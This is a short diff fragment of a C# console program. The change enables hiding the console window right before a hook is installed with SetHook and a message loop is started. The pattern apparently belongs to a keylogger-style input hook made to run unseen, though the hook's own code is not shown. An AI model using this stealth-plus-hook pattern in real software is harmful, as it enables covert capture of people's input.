@@ -51,7 +51,7 @@ namespace ConsoleApp1
             var handle = GetConsoleWindow();
 
             //Hide
-            //ShowWindow(handle, SW_HIDE);
+            ShowWindow(handle, SW_HIDE);
 
             _hookID = SetHook(_proc);
             Application.Run();
